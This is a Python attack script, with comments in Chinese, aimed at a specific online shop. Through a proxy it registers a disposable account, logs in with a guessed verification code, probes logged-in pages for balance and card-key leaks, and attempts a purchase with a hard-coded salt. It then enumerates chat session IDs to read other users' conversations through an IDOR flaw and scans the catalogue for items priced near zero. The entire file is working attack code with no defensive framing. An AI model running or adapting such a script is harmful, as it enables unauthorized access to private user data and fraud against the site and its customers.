#!/usr/bin/env python3
"""注册用户后会话滥用 + chat IDOR + 全站低价商品扫描"""
import subprocess, re, os, json, random, urllib.parse

PX = [l.split("=", 1)[1].strip().strip('"') for l in open("/data/config/proxy.env") if l.startswith("PROXY_URL=")][0]
UA = "Mozilla/5.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
CK = "/tmp/userabuse.ck"
HS = "256"

def c(url, post=None):
    cmd = ["curl", "-s", "-i", "--max-time", "18", "-x", PX, "-A", UA, "-H", f"Referer: {REF}", "-b", CK, "-c", CK]
    if post is not None:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout

if os.path.exists(CK):
    os.remove(CK)

user = f"p{random.randint(100000,999999)}"
pwd = "Test123456!"

# register via ajax if available
r = c(f"{B}/user/reg.php")
csrf = re.search(r'csrf_token\s*=\s*"([^"]+)"', r)
if csrf:
    post = f"user={user}&pass={pwd}&pass2={pwd}&qq=1234567890&email={user}@ex.com&csrf_token={csrf.group(1)}"
    reg = c(f"{B}/user/reg.php", post=post)
    print("reg user", user, "ok" if "成功" in reg or "location" in reg.lower() else reg[-300:])

login = c(f"{B}/user/login.php", post=f"user={user}&pass={pwd}&code=0000")
print("login", "location" in login.lower() or "成功" in login)

# authed pages
for p in ["user/record.php", "user/recharge.php", "user/index.php"]:
    body = c(f"{B}/{p}")
    hdr, _, content = body.partition("\r\n\r\n")
    leak = any(x in content for x in ["余额", "卡密", "kminfo", "¥", "充值"])
    print(p, "len", len(content), "leak", leak, content[:120].replace("\n", " "))

# payrmb as logged in user
page = c(f"{B}/?mod=buy&tid=194")
_, _, page_body = page.partition("\r\n\r\n")
csrf2 = re.search(r'csrf_token\s*=\s*"([^"]+)"', page_body)
if csrf2:
    post = f"tid=194&inputvalue=test&num=1&hashsalt={HS}&csrf_token={csrf2.group(1)}&pay_type=rmb"
    pay = c(f"{B}/ajax.php?act=pay", post=post)
    _, _, pay_body = pay.partition("\r\n\r\n")
    print("payrmb", pay_body[:200])

# chat IDOR
print("\n=== chat IDOR ===")
for sid in ["1", "10", "50", "68", "71", "72", "100"]:
    r = c(f"{B}/user/ajax_chat.php?act=get&session_id={sid}")
    _, _, b = r.partition("\r\n\r\n")
    if '"data"' in b and len(b) > 60 and "[]" not in b.replace(" ", ""):
        print("HIT sid", sid, b[:200])
    elif '"code":0' in b:
        print("sid", sid, b.strip()[:100])

# scan cheap goods via getclass
print("\n=== cheap goods ===")
_, _, gc = c(f"{B}/ajax.php?act=getclass", post="").partition("\r\n\r\n")
try:
    classes = json.loads(gc).get("data", [])
    for cl in classes[:5]:
        cid = cl.get("cid")
        _, _, gt = c(f"{B}/ajax.php?act=getgoods", post=f"cid={cid}").partition("\r\n\r\n")
        try:
            goods = json.loads(gt).get("data", [])
            for g in goods:
                pr = float(g.get("price", 999) or 999)
                if pr <= 0.01:
                    print("FREE", g.get("tid"), pr, g.get("name", "")[:40])
        except Exception:
            pass
except Exception as e:
    print("getclass err", e)
